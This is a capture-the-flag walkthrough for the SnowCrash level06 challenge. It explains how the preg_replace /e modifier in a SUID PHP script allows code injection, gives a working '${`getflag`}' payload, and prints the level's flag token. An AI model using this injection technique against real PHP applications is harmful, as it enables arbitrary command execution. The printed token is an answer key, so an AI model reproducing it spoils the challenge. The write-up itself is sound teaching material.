# 🔐 Level 06

> **Category:** PHP Code Injection  
> **Difficulty:** ⭐⭐⭐☆☆  
> **Key Technique:** preg_replace /e modifier exploitation

---

## 📋 Overview

A PHP script uses the dangerous `/e` modifier in `preg_replace()`, allowing arbitrary code execution through crafted input.

---

## 🔍 Reconnaissance

### Examining the Files

```bash
level06@SnowCrash:~$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

### Analyzing the PHP Script

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

---

## 💡 Vulnerability Analysis

The critical line is:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

> [!CAUTION]
> **The `/e` modifier is deprecated and dangerous!** It evaluates the replacement string as PHP code. Whatever matches `(.*)` gets passed to `y()` as a PHP expression, not a string.

By injecting `${`...`}` syntax, we can execute arbitrary shell commands.

---

## 🎯 Exploitation

### Creating the Exploit File

```bash
# Create file with payload
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit

# Execute the SUID binary with our file
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

> [!TIP]
> The `${`getflag`}` syntax uses PHP's complex variable parsing to execute the command in backticks.

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `wiok45aaoguiboiki2tuin6ub` |

---

## 📚 References

- [PHP preg_replace /e Modifier](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php)
- [PHP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)